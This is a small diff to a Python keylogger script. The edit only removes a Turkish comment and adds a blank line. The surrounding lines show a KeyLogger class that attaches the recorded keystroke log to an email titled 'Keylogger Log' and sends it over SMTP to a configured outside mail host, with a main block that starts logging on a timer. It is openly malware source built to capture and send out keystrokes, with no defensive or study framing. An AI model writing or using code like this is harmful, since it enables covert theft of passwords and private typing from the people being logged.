@@ -34,8 +34,6 @@ class KeyLogger:
             msg["From"] = FROM_EMAIL
             msg["To"] = TO_EMAIL
             msg["Subject"] = "Keylogger Log"
-
-            # UTF-8 destekli içerik
             msg.attach(MIMEText(self.log, "plain", "utf-8"))
 
             with smtplib.SMTP(MAILTRAP_HOST, MAILTRAP_PORT) as server:
@@ -56,3 +54,4 @@ class KeyLogger:
 if __name__ == "__main__":
     keylogger = KeyLogger(SEND_INTERVAL)
     keylogger.start()
+
